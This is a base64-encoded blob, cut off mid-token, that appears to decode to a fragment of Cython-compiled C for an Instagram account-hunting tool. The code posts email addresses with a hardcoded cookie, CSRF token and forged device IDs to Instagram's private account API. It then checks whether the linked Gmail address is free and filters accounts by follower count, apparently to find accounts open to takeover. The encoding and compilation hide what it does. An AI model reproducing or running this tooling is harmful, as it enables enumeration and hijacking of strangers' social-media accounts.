JSKDAsIDE3OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5TnVtYmVyX0FkZChfX3B5eF92X2RldiwgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTc4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF92X2RldmljZV9pZCA9IF9fcHl4X3RfNDtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQ0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE4MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxODAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxODAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF92X3V1aSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE4MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Vc2VyX0FnZW50LCBfX3B5eF92X3VhKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ29udGVudF9UeXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTgyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxODgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jc3JmdG9rZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmopIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWRpZCwgX19weXhfdl91dWkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3VpZCwgX19weXhfdl91dWkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF92X2RldmljZV9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODksIF9fcHl4X0wzX2Vycm9yKVxuXG4gICAgICBcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWVyeSwgX19weXhfdl9lbWFpbCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdF83ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzkpKSkge1xuICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzkpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF85LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfNn07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTg4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaWduZWRfYm9keSwgX19weXhfdF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWdfc2lnX2tleV92ZXJzaW9uLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7XG4gICAgICAgIF9fcHl4X3RfOSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzkpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTk3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWVvdXQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoKFB5T2JqZWN0KilfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF80KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF8xMDtcbiAgICAgIF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDIwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzE0ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X2VtYWlsLCBfX3B5eF90XzEwLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzE0KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfMTQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tLCBfX3B5eF92X2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19weXhfdF8xNCkge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9zZWxmO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfdl9lbWFpbH07XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hlY2tfZ21haWwsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMDtcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3ZfZW1haWw7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF83ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183fTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjA1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzEwLCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIwNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF82O1xuICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIwNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF8xNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfdl91c2VybmFtZSwgX19weXhfdF82LCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCAyMDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIGlmIChfX3B5eF90XzE0KSB7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMDgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X3ZfdXNlcm5hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjA3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X2ZvbGxvd2VyX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAsIFB5X0dFKTsgX19QeXhfWEdPVF